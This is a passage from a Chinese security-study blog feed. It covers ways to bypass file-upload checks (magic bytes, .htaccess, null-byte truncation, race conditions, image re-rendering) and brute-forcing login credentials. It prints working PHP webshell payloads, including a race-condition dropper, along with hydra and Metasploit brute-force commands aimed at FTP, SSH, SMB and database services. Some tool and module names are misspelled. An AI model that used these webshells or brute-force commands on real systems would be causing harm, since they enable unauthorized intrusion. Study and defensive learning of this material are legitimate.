-<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
-</ul>
-<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
-<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
-<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
-<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
-<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
-</ul>
-<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
-<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
-<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
-<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
-<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
-<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
-<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
-<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
-  </entry>
-  <entry>
-    <title>网络安全之认证技术</title>
-    <url>/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="爆破工具："><a href="#爆破工具：" class="headerlink" title="爆破工具："></a>爆破工具：</h3><ul>
-<li>Hydar（九头蛇）<br><a href="https://github.com/vanhauser-thc/thc-hydar">https://github.com/vanhauser-thc/thc-hydar</a><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/1.png"><br>常用口令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># FTP爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt ftp://192.168.0.1 -vV    //大写字母表示导入一个字典。-vV爆出输出日志，看是什么时候成功的</span><br><span class="line"></span><br><span class="line"># SSH爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt ssh://192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"># SMB爆破</span><br><span class="line">hydar -l admin -P password.txt smb://10.211.55.9      //小写字母&quot;l表示单个用户</span><br><span class="line"></span><br><span class="line"># MSSQL爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt //192.168.0.1 mssql -vV</span><br><span class="line"></span><br><span class="line">#MYSQL爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt //192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure></li>
-<li>SNETCarcker(超级弱口令工具)<br><a href="https://github.com/shack2/SNETCarcker">https://github.com/shack2/SNETCarcker</a><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/2.png"><br>是一款windows平台的弱口令审计工具，支持批量多线程检查<br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/3.png"><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/4.png"></li>
-<li>关闭防火墙<br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/5.png"></li>
-</ul>
-<p><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/6.png"><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/7.png"></p>
-<h2 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h2><ul>
-<li>Oracle Datebase，又名Oracle RDBMS，或简称Oracle，是甲骨文公司的一款关系数据库管理系统。默认端口为1521端口，和其他数据库不同的是，爆破前得先爆破队赢得SID，不过SID很多都是默认的，可以使用MSF来进行爆破。<br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/8.png"></li>
-</ul>
-<h3 id="Metasploit爆破SID"><a href="#Metasploit爆破SID" class="headerlink" title="Metasploit爆破SID"></a>Metasploit爆破SID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/sid_bruate</span><br><span class="line">set RH0STS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<h3 id="爆破-3306-MySQL"><a href="#爆破-3306-MySQL" class="headerlink" title="爆破 3306 MySQL"></a>爆破 3306 MySQL</h3><ul>
-<li>MySQL是一个关系型数据库管理系统，默认端口为3306<br>爆破前检测是否开启数据库外连，不要做无意义的爆破，可以手动写Python脚本来批量验证。</li>
 </ul>
 ]]></content>
   </entry>
